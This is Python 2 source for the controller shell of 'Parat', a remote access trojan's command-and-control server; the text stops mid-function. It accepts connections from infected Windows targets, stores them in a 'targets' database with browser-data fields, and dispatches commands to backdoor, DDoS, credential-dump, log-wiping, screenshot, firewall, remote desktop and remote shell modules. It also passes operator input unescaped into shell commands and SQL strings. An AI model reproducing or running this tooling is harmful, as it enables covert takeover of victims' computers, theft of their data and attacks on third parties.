#
# Copyright(c) 2017, micle(@micle_fm - www.micle.ir - mhd.ceh8@gmail)
# Parat project is under the GNU GENERAL PUBLIC LICENSE (GPL) license.
# see the COPYING file for the detailed licence terms
#
from __future__ import print_function

# python stdlib
import traceback
import os
import code
import sys
import logging
import shlex
import re
import pty
import StringIO
import socket
import signal
import Queue
import readline
import threading
import sqlite3

from time import sleep
from datetime import datetime

# parat envairment modules
from conf import config_file, path_to_db
from update.Updater import check_update

from lib import (
    auto_complete,
    get_lan_ip,
    colorize,
    clear_screen,
    pprint,
    gray,
    LoopsHelp,
    print_version,
    show_info,
    print_banner,
    ParatProcessBar,
    Encode,
    Decode,
    exit_normally,
    linux,
    disconnect_it,
    show_trace,
    echo_history,
    rand_str,
    echo_des_message,
    check_history_exist
)

from modules import (
    ParatWget,
    ParatScanner,
    ParatDirections,
    ParatExplorer,
    ParatZipUtils,
    ParatWinShell,
    ParatSharing,
    ParatScreenshot,
    ParatDumper,
    ParatProcess,
    ParatFirewall,
    ParatRDP,
    ParatBackdoor,
    ParatDDOS,
    ParatRunFile,
    ParatMsgBox,
    ParatPower,
    ParatUninstall,
    ParatLogC
)
from Creds import ParatLogin
from Creator import ParatGenerate
from ArgumentParser import ParatArgParse
from Handler import tumultuous




# set start time
start_now  = datetime.now()
log_name   = start_now.strftime("%Y-%m-%d")
log_name  += ".log"

# logging configure & prepare <file>
logging.basicConfig(handler=file, level=logging.DEBUG)
plog            = logging.getLogger(__name__)
plog.propagate  = False
log_file        = os.path.join('conf', 'logs', log_name)
log_handler     = logging.FileHandler(log_file)
log_handler.setLevel(logging.INFO)
Formatter       = logging.Formatter(
'%(asctime)s %(name)s-(%(module)s)[%(process)d]-%(levelname)s  %(lineno)d:%(message)s', "%H:%M:%S")
log_handler.setFormatter(Formatter)
plog.addHandler(log_handler)


prompt_q = Queue.LifoQueue()
cut_q    = Queue.LifoQueue()




class ParatShell(object):

    """
    Main class that define all variables, inclue objects and
    do most synchronization such as listenning, controlling and etc
    """

    def __init__(self):

        plog.info("parat started <" + "-"*10)
        signal.signal(signal.SIGTSTP, signal.SIG_IGN)

        self.ROOT              = os.path.abspath('')
        self.login             = ParatLogin()
        self.cli_counter       = 0
        self.used_ports        = {}
        self.cdisplay          = {} # <dict> {client_id: 'client_id, remote_ip, local_port, remote_port'}
        self.client            = {} # <dict> {client_id: [connection, path, username, remote_ip, remote_port, local_port]}
        self.stop_all_threads  = False
        self.last_command      = None
        self.wash              = lambda inp: inp.lower().strip()
        self.config            = config_file()
        self.conf_path         = config_file('get_path')
        self.path              = os.path.abspath(os.path.dirname(sys.argv[0]))
        self.history_path      = "{}/.Parat_history".format(self.ROOT)
        self.origin_sigint     = signal.getsignal(signal.SIGINT)
        self.main_comands      = [c for c in self.wash(self.config.get('auto_complete', 'main_commands')).split(', ')]
        self.target_comands    = [c for c in self.wash(self.config.get('auto_complete', 'target_commands')).split(', ')]
        self.colors            = True if self.wash(self.config.get('cmd', 'colors')) == "on" else False
        self.banner            = True if self.wash(self.config.get('cmd', 'display_banner')) == "on" else False
        self.randbc            = True if self.wash(self.config.get('cmd', 'banner_random_color')) == "on" else False
        self.verbose           = True if self.wash(self.config.get('cmd', 'debug')) == "on" else False
        self.lhost             = self.wash(self.config.get('base', 'local_host'))
        self.port              = self.wash(self.config.get('base', 'local_port'))
        self.parser            = ParatArgParse(self, self.wash)
        self.ping_port         = 7777
        self.ping_delay        = 1#s
        self.close             = exit

        # read commands history from file
        if os.path.isfile(self.history_path):
            readline.read_history_file(self.history_path)
        else:
            open(self.history_path, 'a').close()

        # log start config details
        plog.info("path: "        + str(self.ROOT))
        plog.info("color: "       + str(self.colors))
        plog.info("debug: "       + str(self.verbose))
        plog.info("local_host: "  + str(self.lhost))
        plog.info("local_port: "  + str(self.port))





    def refresh_all(self):

        self.colors   = True if self.wash(self.config.get('cmd', 'colors')) == "on" else False
        self.banner   = True if self.wash(self.config.get('cmd', 'display_banner')) == "on" else False
        self.randbc   = True if self.wash(self.config.get('cmd', 'banner_random_color')) == "on" else False
        self.verbose  = True if self.wash(self.config.get('cmd', 'debug')) == "on" else False




    def do_exit(self):

        exit_normally(
            plog,                  # write exiting log
            self.client,           # remove clients(list-show) <clear:memory>
            self.pdb,              # for close opened database
            self.cli_counter,      # default value <do:memory>
            self.stop_all_threads  # stop working threads
        )



    def exit_with_active_seassion(self):

        text = colorize(
            "Closing",
            colored=self.colors,
            status="INF"
        )
        process_bar = ParatProcessBar('\r' + text, "#RELAXATION")
        process_bar.start_process()

        if self.login.check():
            for path, folders, files in os.walk(os.path.abspath('')):
                [self.login.encrypt('/'.join([path, f])) for f in files]
        self.do_exit()





    def check_db(self):

        self.db_name = path_to_db()

        if not os.path.isfile(self.db_name):

            with open(self.db_name, "w") as db:
                pass
            db.close()

        self.pdb = sqlite3.connect(self.db_name, check_same_thread=False)
        self.pdb.text_factory = lambda t: unicode(t, "utf-8", "ignore")

        plog.info("connected to database: " + str(self.db_name))

        self.pdb.execute('''\
        CREATE TABLE if not exists "admin" (
        "ID"  INT  PRIMARY KEY  NOT NULL, "password"  NOT NULL)''')

        self.pdb.execute('''\
        CREATE TABLE if not exists "targets" (
            "ID"  INT  PRIMARY KEY  NOT NULL ,
            "IP"  TEXT  NOT NULL,
            "cPort"  INT  NOT NULL,
            "OS"  NOT NULL,
            "Host"  NOT NULL,
            "User"  NOT NULL,
            "uPath"  NOT NULL,
            "Backdoor"  NOT NULL,
            "Information"  TEXT,
            "oPorts"  TEXT,
            "Services"  TEXT,
            "Programs"  TEXT,
            "Chrome"  TEXT,
            "Mozilla"  TEXT
        )''')

        self.pdb.commit()




    def get_python(self, head):

        if head is not None: pprint(head)
        exit = "use 'ctrl+d' to get back parat loop".replace('"', "")
        code.interact(local=locals())




    def shortcut(self, order_cm):

        match = re.match(r"\!(\d+)$", order_cm)

        if match is not None:

            command_id = int(match.group().replace("!", ""))

            try:
                with open(self.history_path, 'r') as history:
                    for line, command in enumerate(history.readlines()):

                        if line == command_id:
                            sys.stdin = StringIO.StringIO(command.strip())

                history.close()

            except Exception as error:
                pprint(
                    colorize(
                        error,
                        colored=self.colors,
                        status="ERR"
                    ), 1)
        else:
            pprint(
                colorize(
                    "Please enter commands id.\n",
                    colored=self.colors,
                    status="ERR"
                ), 1)




    def update_banner(self, order_cm):

        self.refresh_all()
        randbc = 0

        if order_cm.lower().endswith('-r'):
            randbc = 1

        if self.banner:
            print_banner(randbc)
        else:
            pprint(
                colorize(
                    "Banner disabled.\n",
                    colored=self.colors,
                    status="WAR"
                ))



    def change_dir(self, order_cm):

        pattern   = re.compile(r"cd (.+)$")
        new_path  = re.search(pattern, order_cm).group(1)

        try:                         # change directory
            os.chdir(new_path)
            pprint(os.getcwd() + '\n')
            plog.info("cd:" + os.getcwd())

        except Exception as e:

            if e.errno == 2:
                pprint(
                    colorize(
                        "No such file or directory: '%s'\n" % new_path,
                        colored=self.colors,
                        status="ERR"
                    ), 1)
            else:                 # unwanted problems
                pprint(
                    colorize(
                        str(e) + '\n',
                        colored=self.colors,
                        status="ERR"
                    ), 1)

            show_trace(self.verbose)
            plog.error(str(e))





    def _ping(self, connection, client_id):


        def create_ping():

            ping_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            ping_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            ping_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
            ping_sock.bind(('', self.ping_port))
            ping_sock.listen(1)
            ping_sock.settimeout(self.ping_delay)

            return ping_sock


        lport     = int(self.client[client_id][5])
        rport     = int(self.client[client_id][4])
        rip       = str(self.client[client_id][3])
        cliuser   = str(self.client[client_id][2])

        ping = create_ping()
        conn = ping.accept()[0]

        while not self.stop_all_threads and self.client.get(client_id):

            try:
                conn.recv(32)
                cut_q.put("continue")

            except (socket.error, socket.timeout, AttributeError):
                break

        try:

            conn.close()

            disconnect_it(
                client_id,
                self.client,
                self.cdisplay,
                self.ROOT,
                plog,
                self.colors
            ); cut_q.put("break")

            # active_prompt = prompt_q.get()
            # sys.stdin = StringIO.StringIO('')
            # pprint(active_prompt)

        except Exception as e:

            if type(e) == KeyError:
                pass
            else:
                show_trace(self.verbose)
                plog.error(str(e))





    def listen_daemonize(self):

        if not self.used_ports.has_key(self.port):

            self.used_ports[self.port] = 1

            listen_thread = threading.Thread(
                target = Listen_Class.do_listen,
                args   = (
                    self,
                    "SOCK_" + str(self.port),
                    self.port
                ))
            listen_thread.daemon = True
            lname = "ListenThread_" + str(self.port)
            listen_thread.setName(lname)
            listen_thread.start()

            plog.info("new thread: " + lname)

        else:
            pass




    def main_loop_heads(self):

        sys.stdout.flush()

        self.listen_daemonize()
        self.refresh_all()

        # main prompt text
        self.main_loOp = "@".join([
            colorize("Parat", colored=self.colors, color="LBLUE"),
            colorize("main", colored=self.colors, color="LBLUE")
        ])
        self.zom_loOp = "@".join([
            colorize("Parat", colored=self.colors, color="LBLUE"),
            colorize("target", colored=self.colors, color="LBLUE")
        ])

        # set prompt buffer
        self.in_main_prompt = "\r[" + self.main_loOp + "]$ "
        prompt_q.put(self.in_main_prompt)

        completer = auto_complete(self.main_comands)
        readline.set_completer(completer.complete)
        readline.parse_and_bind('tab: complete')




    def main_background(self):

        self.oldstdin = sys.stdin
        tolow = lambda b: b.lower()


        while True:

            try:

                self.main_loop_heads()
                check_history_exist(self.history_path)

                if not sys.stdin.closed:
                    order_cm = raw_input(self.in_main_prompt).strip()
                else:
                    self.close()

                if self.last_command != order_cm:
                    linux("echo '{}' >> '{}'".format(order_cm, self.history_path))
                sys.stdin = self.oldstdin


                # press enter
                if len(order_cm) == 0: continue


                elif tolow(order_cm) == 'help':
                    LoopsHelp.in_main(self)


                elif order_cm.startswith('!'):
                    self.shortcut(order_cm)


                elif tolow(order_cm).startswith('banner'):
                    self.update_banner(order_cm)


                elif tolow(order_cm) == 'clear':
                    clear_screen()


                elif tolow(order_cm) == 'history':
                    echo_history(self.history_path)


                elif tolow(order_cm).startswith('cd'):
                    self.change_dir(order_cm)


                elif tolow(order_cm) == 'pwd':
                    pprint(os.getcwd() + '\n')


                elif tolow(order_cm) == 'config':
                    linux("nano '{}'".format(self.conf_path))
                    self.refresh_all()


                elif tolow(order_cm) == 'python':
                    self.get_python(None)


                elif tolow(order_cm).startswith('listen'):

                    argument = toarg(order_cm)

                    self.parser.listen_method(
                        argument,
                        self.used_ports,
                        Listen_Class,
                        plog,
                        self.colors
                     )


                elif tolow(order_cm).startswith('generate'):

                    argument   = toarg(order_cm)
                    generator  = ParatGenerate()

                    self.parser.generate_method(
                        argument,
                        generator,
                        self.config,
                        self.port,
                        plog,
                        self.colors
                    )


                elif tolow(order_cm).startswith('setting'):

                    argument = toarg(order_cm)

                    self.parser.setting_method(
                        argument,
                        self.pdb,
                        self.config,
                        self.conf_path,
                        plog,
                        self.colors
                    )


                elif tolow(order_cm) == 'version': print_version()


                elif tolow(order_cm) == 'author': show_info()


                elif tolow(order_cm) == 'exit -y': self.do_exit()


                elif tolow(order_cm) == 'exit':

                    if len(self.client) == 0:

                        if self.login.check():
                            for path, folders, files in os.walk(os.path.abspath('')):
                                [self.login.encrypt('/'.join([path, f])) for f in files]
                        self.do_exit()

                    else:

                        self.exit_with_active_seassion()



                elif tolow(order_cm).startswith('session'):

                    argument = toarg(order_cm)

                    self.parser.sessions_method(
                        argument,
                        self.client,
                        self.cdisplay,
                        self.cli_counter,
                        ClientShell,
                        self.ROOT,
                        prompt_q,
                        self.in_main_prompt,
                        plog,
                        self.colors
                    )


                elif tolow(order_cm) == 'off':
                    linux("shutdown -h now")


                else:
                    linux(order_cm)


                self.last_command = order_cm


            except ValueError as e:

                show_trace(self.verbose)
                plog.info(str(e))#; break
                sleep(0.1)
                self.close()

            except EOFError as e:
                plog.info(str(e))#; break
                sleep(0.1)

            except Exception, e:

                # except unknown errors
                show_trace(self.verbose)
                plog.error(str(e))
                pprint(
                    colorize(
                        str(e) + '\n',
                        colored=self.colors,
                        status="ERR"
                    ), 1)
                sleep(0.1)


            except KeyboardInterrupt: pprint('\n')






class Listen_Class(ParatShell):
    """
    Do and synchronize listen threads
    """

    def __init__(self):
        # super(Listen_Class, self).__init__()
        ParatShell.__init__(self)


    @staticmethod
    def create_tcp_socket(self, socket_name, port):

        listen_host, listen_port = '', int(port)

        socket_name = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socket_name.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        socket_name.bind((listen_host, listen_port))
        socket_name.listen(1)

        return socket_name


    @staticmethod
    def do_listen(self, socket_name, port):

        target_tbl = "targets"

        def echo_permission_denied():

            pprint(
                u"\u001b[1A" + colorize(
                    "Port %s in use.\n" % colorize(
                            listen_port,
                            colored=self.colors,
                            color="YELLOW"
                        ),
                    colored=self.colors,
                    status="ERR"
                ), 1)



        def echo_new_seassion(listen_port, client_user, remote_port):

            message = colorize(
                "\r[+]Session {} Opened on {} ({}) <- [{}:{}]".format(
                        self.cli_counter,
                        listen_port,
                        client_user,
                        self.remote_ip,
                        remote_port
                ), colored=self.colors, color="LGREEN")
            pprint(message + '\n')
            return message



        def insert_to_database(client_user, user_folder):

            query = '''\
            INSERT OR IGNORE INTO  "{}" (
            ID, IP, cPort, OS, Host, User, uPath, Backdoor, Information, oPorts, Services, Programs
            ) VALUES ("{}", "{}", "{}", "{}", "{}", "{}", "{}", "{}", "{}", "{}", "{}", "{}"
            )'''.format(
                target_tbl,
                int(self.cli_counter),
                self.remote_ip,
                int(port),
                "Windows",
                client_user.split("@")[1],
                client_user.split("@")[0],
                user_folder,
                0,
                None,
                None,
                None,
                None
            )
            self.pdb.execute(query)
            self.pdb.commit()



        while not self.stop_all_threads:

            try:              # prepare socket

                listen_host, listen_port = '', int(port)
                sock = Listen_Class.create_tcp_socket(self, socket_name, port)

            except Exception as e:

                if "Too many open files" in e or "Address already in use" in e or "list index out of range" in e: pass

                elif "Permission denied" in e:
                    echo_permission_denied()
                    break
                else:            # print other exceptions
                    show_trace(self.verbose)
                    pprint(
                        colorize("ListenDaemonError: %s\n" % e,
                        colored=self.colors,
                        status="ERR"), 1
                    )
                plog.error(str(e))
                sleep(0.1)

            else:

                try:              # connect and decode recived information
                    connection, address = sock.accept()
                    client_user = Decode(connection.recv(4096))
                    regex = re.match(r".+@.+", client_user)

                    if regex:

                        sleep(0.1)

                        # update envairment variables
                        self.remote_ip, remote_port = address
                        self.cli_counter += 1

                        # create user path if not exist
                        user_folder = os.path.join(
                            self.ROOT, 'users',
                            '_'.join([str(self.cli_counter), client_user, rand_str(6)])
                        )
                        if not os.path.isdir(user_folder):
                            os.makedirs(user_folder)

                        self.client[self.cli_counter] = [
                            connection,
                            user_folder,
                            client_user,
                            self.remote_ip,
                            remote_port,
                            port
                        ]
                        insert_to_database(client_user, user_folder)

                        # recive ping from client
                        ping_thread = threading.Thread(
                            target=self._ping,
                            args=(connection, self.cli_counter)
                        )
                        # send ping for client
                        ping_thread.daemon = True
                        ping_thread.start()

                        client_list_show = '{:<8}{:<62}{:<8}{:>4}\n'.format(
                            self.cli_counter,
                            self.remote_ip + "({})".format(client_user),
                            str(listen_port),
                            str(remote_port)
                        )

                        # manage connections
                        self.cdisplay[self.cli_counter]  = client_list_show
                        self.client[self.cli_counter][0] = connection

                        message = echo_new_seassion(listen_port, client_user, remote_port)

                        # log new connection
                        self.cdisplay[self.cli_counter] = client_list_show
                        plog.info(gray(message.replace("\r[+]", "")))
                        plog.info(
                            "database updated [TABLE:%s; ID:%s]" % \
                                (
                                    target_tbl,
                                    self.cli_counter
                                ))

                        if not prompt_q.empty():
                            last_Q_prompt = prompt_q.get()
                            prompt_q.task_done()
                        else:
                            last_Q_prompt = self.in_main_prompt

                        # update prompt buffer (set newest prompt_command)
                        echo_prompt = last_Q_prompt
                        pprint(echo_prompt)

                    else:
                        pass

                except socket.error:
                    sleep(0.1) # continue listenning

        self.stop_all_threads = False








class ClientShell(ParatShell):
    """
    Control client connection
    """

    def __init__(self):
        ParatShell.__init__(self)


    @staticmethod
    def ctrl_loop(self, client_id, Connection):


        def get_user_input():
            ctrl_command = raw_input(self.in_remote_prompt)
            write_history(ctrl_command.strip())
            return ctrl_command.strip()


        def print_help():
            LoopsHelp.in_controller(self)
            pprint(colorize(
                self.client[client_id][1] + '\n\n',
                colored=self.colors,
                color="LVIOLET"
            ))


        def check_signal():
            if signal.getsignal(signal.SIGINT) is not self.origin_sigint:
                signal.signal(signal.SIGINT, self.origin_sigint)


        def set_values():
            self.direcs   = ParatDirections(Connection, self.colors)
            self.process  = ParatProcess(Connection, self.colors)
            self.shares   = ParatSharing(Connection, self.colors)


        def set_ctrl_completer():
            completer = auto_complete(self.target_comands)
            readline.set_completer(completer.complete)
            readline.parse_and_bind('tab: complete')


        def get_ready_ctrl():
            current_dir = self.client[client_id][1]
            os.chdir(current_dir)
            plog.info("control loop: " + self.cdisplay[client_id])
            plog.info("directory: " + current_dir)


        def refresh_prompt():
            using_client = " " + colorize(client_id, colored=self.colors, color="LRED")
            self.in_remote_prompt = "\r[" + self.zom_loOp + using_client + "]# "
            prompt_q.put(self.in_remote_prompt)


        def write_history(ctrl_command):
            if self.last_command != ctrl_command:
                linux("echo '{}' >> '{}'".format(ctrl_command, self.history_path))


        def get_back_to_main():
            os.chdir(self.ROOT)
            prompt_q.put(self.in_main_prompt)
            plog.warning("background: main loop")
            self.main_background()



        def shift_to_other_seassion(ctrl_command):

            try:
                new_target = int(ctrl_command.split()[1])
            except Exception as e:
                new_target = None

            if new_target is not None:

                try:
                    new_target = int(new_target)
                    connection = self.client[new_target][0]

                    ClientShell.ctrl_loop(self, new_target, connection)

                except KeyError:

                    show_trace(self.verbose)
                    pprint(
                        colorize(
                            "Client '%s' not found.\n" % new_target,
                            colored=self.colors,
                            status="ERR"
                        ), 1)
            else:
                pprint(
                    colorize(
                        "usage: switch ID\n",
                        colored=self.colors,
                        status="INF"
                ), 1)



        tolow         = lambda b: b.lower()
        self.handler  = "#DATA_HANDLER"

        lport         = int(self.client[client_id][5])
        rport         = int(self.client[client_id][4])
        rip           = str(self.client[client_id][3])
        cliuser       = str(self.client[client_id][2])

        get_ready_ctrl()
        set_ctrl_completer()


        while True:

            try:

                # for define process_bar.Stop at exceptions
                process_bar = ParatProcessBar("excepting")
                process_bar.Stop = True

                # prepare controlling module
                sys.stdout.flush()
                check_update()

                # check for ctrl+c signal enabled/disabled
                check_signal()

                # preapare some values(instance) for target
                set_values()

                # update prompt buffer
                refresh_prompt()

                # keep last commands
                ctrl_command = get_user_input()

                # check ping result
                if cut_q.get() == "break":
                    cut_q.task_done(); break


                if len(ctrl_command.strip()) == 0: continue # press enter


                elif tolow(ctrl_command) == "background":
                    get_back_to_main()


                elif tolow(ctrl_command).startswith('switch'):
                    shift_to_other_seassion(ctrl_command)


                elif tolow(ctrl_command) == "clear": clear_screen()


                elif tolow(ctrl_command) == "help":
                    print_help()


                elif tolow(ctrl_command) == "disconnect":

                    disconnect_it(
                        client_id,
                        self.client,
                        self.cdisplay,
                        self.ROOT,
                        plog,
                        self.colors
                    ); break



                elif tolow(ctrl_command) == "remove":

                    # disable signal and communicate for remove
                    signal.signal(signal.SIGINT, signal.SIG_IGN)
                    Connection.send(Encode(tolow(ctrl_command)))
                    Connection.settimeout(5)
                    recived_data = Decode(Connection.recv(4096))
                    Connection.settimeout(None)
                    recived_data = recived_data.lower() + '\n'

                    if 'server will remove next reboot' in recived_data:

                        disconnect_it(
                            client_id,
                            self.client,
                            self.cdisplay,
                            self.ROOT,
                            plog,
                            self.colors
                        ); break

                    elif 'permission denied' in recived_data or "error" in recived_data:

                        pprint(
                            colorize(
                                recived_data,
                                colored=self.colors,
                                status="ERR"
                            ), 1)



                elif tolow(ctrl_command).startswith("sysinfo"):

                    signal.signal(signal.SIGINT, signal.SIG_IGN)
                    uflag = False
                    user_profile = "USER.inf"

                    try:
                        update = ctrl_command.split()[1]
                        uflag = True if update == "-u" else False
                    except:
                        uflag = False

                    Connection.send(Encode(tolow("sysinfo")))

                    # check for first connection
                    if uflag or not os.path.isfile(user_profile):

                        Connection.send(Encode("#GET_INF"))
                        text = colorize("Please wait", colored=self.colors, status="INF")
                        process_bar = ParatProcessBar(text)
                        process_bar.start_process()

                        system_info = Decode(Connection.recv(4096))
                        process_bar.Stop = True
                        sleep(0.2)

                        if "ERROR" not in system_info:

                            # recive client data
                            while True:

                                junk = Decode(Connection.recv(4096))

                                if junk == '#END_INF':
                                    system_info = system_info.rstrip() + '\n'
                                    break

                                sleep(0.01)
                                system_info += junk.rstrip() + '\n'

                        else:
                            system_info = system_info + '\n'


                        # write data to disk
                        with open (user_profile, "w") as info_file:
                            info_file.write(system_info)
                        info_file.close()

                        process_bar.Stop = True; sleep(0.2)

                        # read & privew information
                        with open(user_profile, 'r') as info:

                            content = info.read()
                            pprint('\n' + content + '\n') if self.colors else pprint(gray('\n' + content + '\n'))
                            self.pdb.execute("UPDATE targets SET Information=? WHERE id=?", (content, client_id))
                            self.pdb.commit()

                    else:

                        Connection.send(Encode("#NO_INF"))

                        with open(user_profile, 'r') as info:

                            content = info.read()
                            pprint('\n' + content + '\n') if self.colors else pprint(gray('\n' + content + '\n'))
                            self.pdb.execute("UPDATE targets SET Information=? WHERE id=?", (content, client_id))
                            self.pdb.commit()

                    info.close()



                elif tolow(ctrl_command) == 'python':

                    head_banner = "{} use 'ctrl+d' to back parat loop\n".format(
                        colorize("NOTE:", "LYELLOW", self.colors)
                    )
                    self.get_python(head_banner)



                elif tolow(ctrl_command) == "continue":
                    signal.signal(signal.SIGINT, signal.SIG_IGN)
                    tumultuous(Connection, self.handler, self.colors, client_id)


                elif tolow(ctrl_command).startswith("explorer"):
                    signal.signal(signal.SIGINT, signal.SIG_IGN)
                    ie = ParatExplorer(Connection, toarg(ctrl_command), self.colors)
                    ie.start()


                elif tolow(ctrl_command).startswith("tree"):
                    signal.signal(signal.SIGINT, signal.SIG_IGN)
                    self.direcs.get_tree()


                elif tolow(ctrl_command).startswith("cd"):
                    signal.signal(signal.SIGINT, signal.SIG_IGN)
                    self.direcs.change_directory(toarg(ctrl_command))


                elif tolow(ctrl_command) == "pwd":
                    signal.signal(signal.SIGINT, signal.SIG_IGN)
                    self.direcs.pwd()


                elif tolow(ctrl_command).startswith("touch"):
                    signal.signal(signal.SIGINT, signal.SIG_IGN)
                    self.direcs.touch_file(toarg(ctrl_command))


                elif tolow(ctrl_command).startswith("rmv"):
                    signal.signal(signal.SIGINT, signal.SIG_IGN)
                    self.direcs.remove(toarg(ctrl_command))


                elif tolow(ctrl_command).startswith("mkdir"):
                    signal.signal(signal.SIGINT, signal.SIG_IGN)
                    self.direcs.make_directory(toarg(ctrl_command))


                elif tolow(ctrl_command).startswith('wget'):
                    signal.signal(signal.SIGINT, signal.SIG_IGN)
                    ParatWget(
                        Connection,
                        toarg(ctrl_command),
                        self.colors
                    ).start()


                elif tolow(ctrl_command).startswith("dos"):

                    signal.signal(signal.SIGINT, signal.SIG_IGN)

                    dos_attack = ParatDDOS(
                        Connection,
                        toarg(tolow(ctrl_command)),
                        self.colors,
                    )
                    dos_attack.prepare_basics()
                    dos_attack.start()


                elif tolow(ctrl_command).startswith("download"):
                    signal.signal(signal.SIGINT, signal.SIG_IGN)
                    self.shares.download(toarg(ctrl_command))


                elif tolow(ctrl_command).startswith("upload"):
                    signal.signal(signal.SIGINT, signal.SIG_IGN)
                    self.shares.upload(toarg(ctrl_command))


                elif tolow(ctrl_command).startswith("scan"):

                    signal.signal(signal.SIGINT, signal.SIG_IGN)

                    scan = ParatScanner(
                        Connection,
                        client_id,
                        self.pdb,
                        toarg(ctrl_command),
                        self.colors
                    )
                    scan.prepare_basics()
                    scan.start()


                elif tolow(ctrl_command) == "screenshot":

                    signal.signal(signal.SIGINT, signal.SIG_IGN)

                    scr_shot = ParatScreenshot(Connection, self.colors)
                    scr_shot.prepare_basics()
                    scr_shot.start()


                elif tolow(ctrl_command) == "rmlog":
                    signal.signal(signal.SIGINT, signal.SIG_IGN)
                    remove_log = ParatLogC(Connection, self.colors)
                    remove_log.start()


                elif tolow(ctrl_command).startswith("uninstall"):
                    signal.signal(signal.SIGINT, signal.SIG_IGN)
                    ParatUninstall(
                        Connection,
                        toarg(ctrl_command),
                        self.colors
                    ).start()


                elif tolow(ctrl_command) == "getps":
                    signal.signal(signal.SIGINT, signal.SIG_IGN)
                    self.process.get_all()


                elif tolow(ctrl_command).startswith("kill"):
                    signal.signal(signal.SIGINT, signal.SIG_IGN)
                    self.process.kill_process(ctrl_command.split())


                elif tolow(ctrl_command).startswith("runfile"):

                    signal.signal(signal.SIGINT, signal.SIG_IGN)

                    execf = ParatRunFile(
                        Connection,
                        toarg(ctrl_command),
                        self.colors
                    )
                    execf.start()


                elif tolow(ctrl_command).startswith("firewall"):

                    signal.signal(signal.SIGINT, signal.SIG_IGN)

                    pwall = ParatFirewall(
                        Connection,
                        toarg(tolow(ctrl_command)),
                        self.colors
                    )
                    pwall.prepare_basics()
                    pwall.start()


                elif tolow(ctrl_command).startswith("desktop"):

                    signal.signal(signal.SIGINT, signal.SIG_IGN)

                    rdp = ParatRDP(
                        Connection,
                        client_id,
                        self.client[client_id][2],
                        self.remote_ip,
                        toarg(tolow(ctrl_command)),
                        self.colors
                    )
                    rdp.prepare_basics()
                    rdp.start()


                elif tolow(ctrl_command).startswith("backdoor"):

                    signal.signal(signal.SIGINT, signal.SIG_IGN)

                    backdoor = ParatBackdoor(
                        Connection,
                        client_id,
                        self.pdb,
                        toarg(tolow(ctrl_command)),
                        self.colors
                    )

                    backdoor.prepare_basics()
                    backdoor.start()


                elif tolow(ctrl_command) == "shell":
                    signal.signal(signal.SIGINT, signal.SIG_IGN)
                    ParatWinShell(Connection, tolow(ctrl_command), self.colors).start()


                elif tolow(ctrl_command).startswith("pzip"):

                    signal.signal(signal.SIGINT, signal.SIG_IGN)

                    pzip = ParatZipUtils(
                        Connection,
                        toarg(ctrl_command),
                        self.colors
                    )
                    pzip.prepare_basics()
                    pzip.start()


                elif tolow(ctrl_command).startswith("msgbox"):

                    signal.signal(signal.SIGINT, signal.SIG_IGN)

                    message_box = ParatMsgBox(
                        Connection,
                        toarg(ctrl_command),
                        self.colors
                    )

                    message_box.prepare_basics()
                    message_box.start()


                elif tolow(ctrl_command).startswith("dump"):

                    signal.signal(signal.SIGINT, signal.SIG_IGN)

                    dump_obj = ParatDumper(
                        Connection,
                        client_id,
                        self.pdb,
                        toarg(ctrl_command),
                        self.colors
                    )

                    dump_obj.prepare_basics()
                    dump_obj.start()


                elif tolow(ctrl_command) == "shutdown" or tolow(ctrl_command) == "reboot":

                    prompt_message = colorize(
                        "You may lost this session (if not backdoor), " + \
                        "Are you sure to {} target(y/N)?: ".format(ctrl_command),
                        colored=self.colors,
                        status="WAR"
                    )
                    while True:

                        x = self.wash(raw_input(prompt_message))

                        if x == 'y' or x == 'yes':

                            # disable signal and communicate for remove
                            signal.signal(signal.SIGINT, signal.SIG_IGN)
                            ParatPower(
                                Connection,
                                ctrl_command,
                                self.colors
                            ).start()

                            Connection.close()

                            # get-back, make-prompt, log-client, clean-cache
                            os.chdir(self.ROOT)
                            prompt_q.put(self.in_main_prompt)
                            plog.warning(ctrl_command + ": " + self.cdisplay[client_id])

                            del self.client[client_id]
                            del self.cdisplay[client_id]

                            echo_des_message(client_id, lport, cliuser, rip, rport, self.colors)

                            # log information
                            plog.info(ctrl_command + " -> main loop")
                            self.main_background()

                        if x == 'n' or x == 'no' or x == '':
                            break

                        else:
                            pass


                else:

                    signal.signal(signal.SIGINT, signal.SIG_IGN)
                    Connection.send(Encode(tolow(ctrl_command)))
                    response = str(Decode(Connection.recv(4096)))

                    if self.colors:
                        pprint('\n' + response + '\n\n')
                    else:
                        pprint(gray('\n' + response))

                self.last_command = ctrl_command



            except (ValueError, socket.error), e:

                if not process_bar.Stop:
                    process_bar.Stop = True
                show_trace(self.verbose)

                # 32  -> Broken pipe <IOError>
                # 104 -> Connection reset by peer
                if e.errno == 104 or e.errno == 32:

                    pprint(
                        colorize(
                            "Client diconnected.\n",
                            colored=self.colors,
                            status="ERR"
                        ), 1)

                    # delete values and log informations
                    del self.cdisplay[client_id]
                    del self.client[client_id]

                    plog.error(str(e))
                    plog.info("socket error -> [main loop]")
                    break

                else:
                    pprint(
                        colorize(
                            str(e) + '\n\n',
                            colored=self.colors,
                            status="ERR"
                        ), 1)

                # log any exceptino accurded
                plog.error(str(e))
                sleep(0.1)



            except KeyboardInterrupt: pprint('\n')


            except EOFError as e:

                if not process_bar.Stop:
                    process_bar.Stop = True
                show_trace(self.verbose)
                plog.error(str(e))
                sleep(0.1)


            except Exception as error:

                if not process_bar.Stop:
                    process_bar.Stop = True

                # except and log unwanted problems
                show_trace(self.verbose)
                pprint(
                    colorize(
                        str(error) + '\n',
                        colored=self.colors,
                        status="ERR"
                    ), 1)

                plog.error(str(error))
                sleep(0.1)







def toarg(c):

    try:
        return shlex.split(c)[1:]
    except Exception as error:
        pass



def notif_creds(colors, login_obg):

    if not login_obg.check():
        # pprint(
        #     colorize(
        #         "Creds disabled. Recommended to use a password!\n",
        #         colored=colors,
        #         status="WAR"
        #     ))
        pass

    for path, folders, files in os.walk(os.path.abspath('')):
        [login_obg.decrypt('/'.join([path, f])) for f in files]



def start_loop(login_obg):

    clear_screen()
    tolow    = lambda i: i.lower()

    banner   = tolow(config_file().get('cmd', 'display_banner'))
    randbc   = True if tolow(config_file().get('cmd', 'banner_random_color')) == "on" else False
    colors   = tolow(config_file().get('cmd', 'colors'))
